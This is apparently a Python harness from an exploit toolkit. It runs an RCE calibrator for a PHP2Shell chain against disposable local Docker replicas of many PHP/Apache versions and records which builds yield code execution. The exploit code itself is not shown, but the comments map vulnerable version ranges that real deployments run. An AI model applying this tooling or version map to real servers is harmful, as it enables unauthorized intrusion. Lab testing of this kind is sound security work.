#!/usr/bin/env python3
"""
php2shell_matrix.py — profile factory for the PHP2Shell RCE chain.

For each build in the matrix it starts a disposable replica (single-worker
Apache + mod_php, display_errors=On, memory_limit=8M), runs
php2shell_calibrate.py against it, and stores the generated profile. A profile
is marked rce=true only when the calibrator executed a command and read the
proof file.

Usage:
    python3 php2shell_matrix.py --repo-dir /tmp/php2shell-rce
    python3 php2shell_matrix.py --only 8.3.35
    python3 php2shell_matrix.py --full-search        # slow stage-2 sweep

Authorized testing only.
"""

from __future__ import annotations

import argparse
import json
import os
import platform
import shutil
import subprocess
import sys
import time
import urllib.request

from php2shell_paths import default_repo_dir, prepare_lab_out

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
LAB = os.path.join(ROOT, "lab", "rce")
PROFILES = os.path.join(ROOT, "profiles")

BUILDS = [
    {"key": "8.2.34", "image": "php:8.2.34-apache", "port": 8090},
    {"key": "8.3.35", "image": "php:8.3.35-apache", "port": 8091},
    {"key": "8.4.26", "image": "php:8.4.26-apache", "port": 8092},
    {"key": "8.5.11", "image": "php:8.5.11-apache", "port": 8093},
    {"key": "8.4.25", "image": "php:8.4.25-apache", "port": 8108},
    {"key": "8.5.10", "image": "php:8.5.10-apache", "port": 8109},
    # Real-world subversions: unpatched builds that deployed systems actually
    # run. 8.4.0, 8.4.3 and 8.4.9 tags are absent from Docker Hub; 8.4.2 is
    # the earliest available 8.4. EOL branches ship from bullseye/buster
    # images.
    {"key": "8.5.5", "image": "php:8.5.5-apache", "port": 8110},
    {"key": "8.5.0", "image": "php:8.5.0-apache", "port": 8111},
    {"key": "8.4.20", "image": "php:8.4.20-apache", "port": 8112},
    {"key": "8.4.10", "image": "php:8.4.10-apache", "port": 8113},
    {"key": "8.4.5", "image": "php:8.4.5-apache", "port": 8114},
    {"key": "8.4.2", "image": "php:8.4.2-apache", "port": 8115},
    {"key": "8.3.20", "image": "php:8.3.20-apache", "port": 8116},
    {"key": "8.2.28", "image": "php:8.2.28-apache", "port": 8117},
    {"key": "8.1.34", "image": "php:8.1-apache", "distro": "bullseye", "port": 8118},
    {"key": "7.4.33", "image": "php:7.4-apache", "distro": "buster", "port": 8119},
    # Fill the subversion gaps inside the vulnerable windows: 8.4.5 is
    # chunk-only and 8.4.10 gets RCE, so 8.4.6-8.4.9 mark the 8.4 boundary;
    # 8.5.0/8.5.5 are leaks-only and 8.5.10 gets RCE, so 8.5.1-8.5.9 (minus
    # the already-covered ones) mark the 8.5 boundary. 8.4.11-8.4.19 sit
    # inside the known-good 8.4 layout family and close the coverage gap.
    {"key": "8.5.1", "image": "php:8.5.1-apache", "port": 8130},
    {"key": "8.5.2", "image": "php:8.5.2-apache", "port": 8131},
    {"key": "8.5.3", "image": "php:8.5.3-apache", "port": 8132},
    {"key": "8.5.4", "image": "php:8.5.4-apache", "port": 8133},
    {"key": "8.5.6", "image": "php:8.5.6-apache", "port": 8134},
    {"key": "8.5.7", "image": "php:8.5.7-apache", "port": 8135},
    {"key": "8.5.8", "image": "php:8.5.8-apache", "port": 8136},
    {"key": "8.5.9", "image": "php:8.5.9-apache", "port": 8137},
    {"key": "8.4.11", "image": "php:8.4.11-apache", "port": 8138},
    {"key": "8.4.12", "image": "php:8.4.12-apache", "port": 8139},
    {"key": "8.4.13", "image": "php:8.4.13-apache", "port": 8140},
    {"key": "8.4.14", "image": "php:8.4.14-apache", "port": 8141},
    {"key": "8.4.15", "image": "php:8.4.15-apache", "port": 8142},
    {"key": "8.4.16", "image": "php:8.4.16-apache", "port": 8143},
    {"key": "8.4.17", "image": "php:8.4.17-apache", "port": 8144},
    {"key": "8.4.18", "image": "php:8.4.18-apache", "port": 8145},
    {"key": "8.4.19", "image": "php:8.4.19-apache", "port": 8146},
    {"key": "8.4.6", "image": "php:8.4.6-apache", "port": 8147},
    {"key": "8.4.7", "image": "php:8.4.7-apache", "port": 8148},
    {"key": "8.4.8", "image": "php:8.4.8-apache", "port": 8149},
]


def arch_label() -> str:
    machine = platform.machine().lower()
    return {"arm64": "aarch64", "x86_64": "amd64", "amd64": "amd64"}.get(machine, machine)


def docker(*args, capture=True, timeout=600):
    return subprocess.run(["docker", *args], capture_output=capture, text=True, timeout=timeout)


def container_arch(name: str) -> str | None:
    result = docker("exec", name, "uname", "-m")
    if result.returncode != 0:
        return None
    return {"aarch64": "aarch64", "arm64": "aarch64",
            "x86_64": "amd64", "amd64": "amd64"}.get(result.stdout.strip().lower())


def wait_http(url: str, timeout: float = 30.0) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(url, timeout=2) as resp:
                if resp.status == 200:
                    return True
        except Exception:
            time.sleep(0.5)
    return False


def run_build(build, args) -> dict:
    distro = build.get("distro", "bookworm")
    label = f"{build['key']}-{distro}-{arch_label()}"
    name = f"p2s-matrix-{build['key'].replace('.', '')}"
    outdir = prepare_lab_out(os.path.join(LAB, "out", build["key"]))
    proof = os.path.join(outdir, "p1")

    print(f"\n=== {label} ({build['image']}) ===", flush=True)
    docker("rm", "-f", name)
    print("[*] pulling/starting image", flush=True)
    run = docker("run", "-d", "--name", name,
                 "-p", f"127.0.0.1:{build['port']}:80",
                 "-v", f"{LAB}/webroot:/var/www/html:ro",
                 "-v", f"{LAB}/php.ini:/usr/local/etc/php/conf.d/zz-matrix.ini:ro",
                 "-v", f"{LAB}/apache.conf:/etc/apache2/conf-enabled/zz-matrix.conf:ro",
                 "-v", f"{outdir}:/out",
                 build["image"], timeout=900)
    if run.returncode != 0:
        print("[!] docker run failed:", run.stderr.strip()[:300])
        return {"label": label, "status": "docker-failed"}

    url = f"http://127.0.0.1:{build['port']}/index.php"
    if not wait_http(url):
        print("[!] replica did not answer")
        docker("rm", "-f", name)
        return {"label": label, "status": "no-http"}

    actual_arch = container_arch(name) or arch_label()
    label = f"{build['key']}-{distro}-{actual_arch}"
    print(f"[*] architecture: {actual_arch}", flush=True)

    cmd = [sys.executable, os.path.join(HERE, "php2shell_calibrate.py"),
           "--target", url, "--container", name,
           "--repo-dir", args.repo_dir,
           "--proof-file", proof,
           "--distro", f"{distro}-{actual_arch}",
           "--arch", actual_arch,
           "--out-dir", PROFILES]
    if not args.full_search:
        cmd += ["--stage2-t", "406"]
    print("[*] calibrating", flush=True)
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=args.timeout)
        log = result.stdout + result.stderr
    except subprocess.TimeoutExpired as exc:
        log = (exc.stdout or "") + (exc.stderr or "") + "\n[!] calibration timeout"
    with open(os.path.join(outdir, "calibrate.log"), "w", encoding="utf-8") as fh:
        fh.write(log)
    print("\n".join(log.strip().splitlines()[-12:]), flush=True)

    if not args.keep:
        docker("rm", "-f", name)

    profile = os.path.join(PROFILES, f"{build['key']}-{distro}-{arch_label()}.json")
    status = "no-profile"
    rce = False
    if os.path.isfile(profile):
        try:
            with open(profile, encoding="utf-8") as handle:
                data = json.load(handle)
            rce = bool(data.get("rce"))
            status = "rce" if rce else "leaks-only"
        except ValueError:
            status = "bad-profile"
    return {"label": label, "status": status, "rce": rce,
            "profile": os.path.relpath(profile, ROOT)}


def main() -> int:
    ap = argparse.ArgumentParser(description="Build PHP2Shell profiles for a matrix of PHP images.")
    ap.add_argument("--repo-dir", default=default_repo_dir())
    ap.add_argument("--only", default=None, help="comma-separated build keys (e.g. 8.4.26,8.3.35)")
    ap.add_argument("--full-search", action="store_true", help="do not hint stage2 (slow)")
    ap.add_argument("--keep", action="store_true", help="keep containers for inspection")
    ap.add_argument("--timeout", type=float, default=900.0)
    args = ap.parse_args()

    if not shutil.which("docker"):
        print("docker not found", file=sys.stderr)
        return 4
    os.makedirs(PROFILES, exist_ok=True)
    builds = BUILDS
    if args.only:
        wanted = {x.strip() for x in args.only.split(",")}
        builds = [b for b in BUILDS if b["key"] in wanted]
    results = [run_build(b, args) for b in builds]

    print("\n=== coverage ===")
    for r in results:
        print(f"  {r['label']:28} {r['status']:12} {r.get('profile', '')}")
    report_dir = os.path.join(ROOT, "docs", "calibration-logs")
    os.makedirs(report_dir, exist_ok=True)
    with open(os.path.join(report_dir, "matrix_report.json"), "w", encoding="utf-8") as fh:
        json.dump(results, fh, indent=2)
    return 0


if __name__ == "__main__":
    sys.exit(main())
